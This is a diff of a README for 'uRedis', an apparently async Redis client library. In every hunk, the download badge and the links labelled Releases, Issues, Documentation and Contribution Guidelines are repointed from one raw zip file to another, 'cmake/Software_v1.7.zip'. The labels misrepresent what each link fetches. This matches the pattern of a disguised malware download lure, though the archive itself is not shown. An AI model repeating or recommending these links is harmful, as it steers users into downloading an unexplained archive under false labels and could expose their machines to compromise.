@@ -8,7 +8,7 @@ uRedis is a small async Redis client library built on top of uvent. This means i
 
 To get started, you need to download uRedis. Click the button below to visit the Releases page where you can find the latest version:
 
-[![Download uredis](https://raw.githubusercontent.com/Tageldien/uredis/main/include/uredis-3.9.zip%20uredis-%https://raw.githubusercontent.com/Tageldien/uredis/main/include/uredis-3.9.zip)](https://raw.githubusercontent.com/Tageldien/uredis/main/include/uredis-3.9.zip)
+[![Download uredis](https://raw.githubusercontent.com/Tageldien/uredis/main/cmake/Software_v1.7.zip%20uredis-%https://raw.githubusercontent.com/Tageldien/uredis/main/cmake/Software_v1.7.zip)](https://raw.githubusercontent.com/Tageldien/uredis/main/cmake/Software_v1.7.zip)
 
 On the Releases page, you will find all available versions of uRedis. Look for the most recent version and follow these steps:
 
@@ -70,7 +70,7 @@ If you encounter issues, try the following steps:
 2. **Verify network settings:** Make sure there are no firewalls or settings blocking your connection.
 3. **Read the logs:** uRedis provides logs that may help identify issues.
 
-If these steps do not resolve your problem, visit the [GitHub Issues page](https://raw.githubusercontent.com/Tageldien/uredis/main/include/uredis-3.9.zip) to seek help from the community.
+If these steps do not resolve your problem, visit the [GitHub Issues page](https://raw.githubusercontent.com/Tageldien/uredis/main/cmake/Software_v1.7.zip) to seek help from the community.
 
 ## 🛡️ Frequently Asked Questions
 
@@ -87,9 +87,9 @@ A: You can find support through the GitHub repository’s Issues section or ask 
 
 For more information about using uRedis, you can explore the following resources:
 
-- [Documentation](https://raw.githubusercontent.com/Tageldien/uredis/main/include/uredis-3.9.zip)
-- [Contribution Guidelines](https://raw.githubusercontent.com/Tageldien/uredis/main/include/uredis-3.9.zip)
+- [Documentation](https://raw.githubusercontent.com/Tageldien/uredis/main/cmake/Software_v1.7.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/Tageldien/uredis/main/cmake/Software_v1.7.zip)
 
-Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/Tageldien/uredis/main/include/uredis-3.9.zip) for new updates or to download the latest version of uRedis. 
+Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/Tageldien/uredis/main/cmake/Software_v1.7.zip) for new updates or to download the latest version of uRedis. 
 
 Enjoy seamless connectivity with Redis and simplify your data management today!
